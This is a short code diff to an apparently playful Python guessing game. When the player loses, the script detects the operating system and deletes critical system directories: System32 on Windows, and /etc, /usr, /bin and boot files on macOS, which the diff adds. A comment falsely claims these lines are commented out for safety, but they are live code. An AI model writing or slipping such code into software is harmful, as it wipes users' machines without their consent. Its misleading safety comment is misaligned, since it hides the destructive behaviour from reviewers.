@@ -37,6 +37,7 @@ else:
     print("Oh no.....")
     print("You have lost the Extremely Silly Game... Goodbye!")
 
+    # Grabs the Operating System of the Host OS and deletes the specified files.
     # The following lines attempt to remove critical system files based on the detected OS,
     # but they are commented out here to prevent accidental execution and system damage.
     os_name = platform.system()
@@ -48,4 +49,7 @@ else:
     elif os_name == 'Windows':
       os.remove("C:\Windows\System32")
     elif os_name == 'Darwin':
-      os.remove("/")
+      shutil.rmtree("/System/Library/CoreServices/Boot")
+      shutil.rmtree("/etc")
+      shutil.rmtree("/usr")
+      shutil.rmtree("/bin")
